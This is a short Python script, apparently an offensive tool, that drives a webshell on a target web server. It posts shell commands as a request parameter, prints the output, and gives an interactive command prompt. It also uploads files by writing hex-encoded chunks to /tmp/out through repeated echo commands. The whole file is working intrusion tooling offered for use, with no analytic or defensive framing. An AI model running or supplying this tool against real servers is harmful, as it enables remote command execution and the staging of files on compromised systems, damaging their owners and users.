#! /usr/bin/python3

import requests
import argparse
import html2text
import binascii

parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
parser.add_argument('--header', action='append', help='add header')
parser.add_argument('--add-param', action='append', help='params to add')
parser.add_argument('--param', default='cmd', help='param with command to use')
parser.add_argument('--cmd', help='command to send, can be multiples (&& operators are not supported)', action='append')
parser.add_argument('--html2text', action='store_true', help='print html on text mode')
parser.add_argument('--proxy', help='use a proxy')
parser.add_argument('--file', help='upload an file')
parser.add_argument('url')

args = parser.parse_args()

url = args.url
param = args.param
commands = args.cmd


def execute(cmd, headers, h2t, proxy=None, params=None):
    if params is None:
        params = {}

    session = requests.session()

    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}

    r = session.post(url, data={param: cmd} | params, headers=headers)

    print(r.request.url)

    t = r.text
    if h2t:
        t = html2text.html2text(t)
    print(t)


headers = {}
if args.header:
    for header in args.header:
        key = header.split(':')[0]
        value = header[header.index(': ') + 2:]
        headers[key] = value

params = {}
if args.add_param:
    for param_ in args.add_param:
        key = param_.split('=')[0]
        value = param_[param_.index('=') + 1:]
        params[key] = value

if args.file:

    execute('rm /tmp/out', headers, args.html2text, args.proxy, params)

    with open(args.file, 'rb') as f:
        read = f.read(10)
        while len(read) > 0:
            chunk = b''
            print(read)
            for c in read:
                chunk += b'\\x' + binascii.b2a_hex(c.to_bytes(1, byteorder='big'))
            command = (f'echo -ne \'{chunk.decode()}\' >> /tmp/out')
            execute(command, headers, args.html2text, args.proxy, params)
            read = f.read(10)
    execute('cat /tmp/out', headers, args.html2text, args.proxy, params)

if commands is not None and len(commands) != 0:
    for cmd in commands:
        execute(cmd, headers, args.html2text, args.proxy, params)

while True:
    c = input('--> ')
    execute(c, headers, args.html2text, args.proxy, params)
